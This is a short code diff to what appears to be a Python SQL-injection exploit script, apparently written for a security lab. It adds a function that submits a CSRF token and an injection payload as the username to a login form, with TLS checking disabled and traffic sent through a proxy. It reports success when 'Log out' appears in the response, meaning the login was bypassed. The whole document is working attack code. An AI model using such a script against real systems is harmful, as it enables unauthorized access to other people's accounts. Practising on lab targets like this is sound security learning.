@@ -14,8 +14,13 @@ def get_csrf(s,url):
 
 def exploit_sqli(s,url, payload):
     csrf = get_csrf(s,url)
-    data ={"csrf":csrf}
+    data ={"csrf":csrf, "username":payload,"password":"randomtext"}    
     r = s.post(url,data=data,verify=False,proxies=proxies)
+    res =r.text
+    if"Log out" in res:
+        return True
+    else:
+        return False
 
 if __name__ == "__main__":
     try:
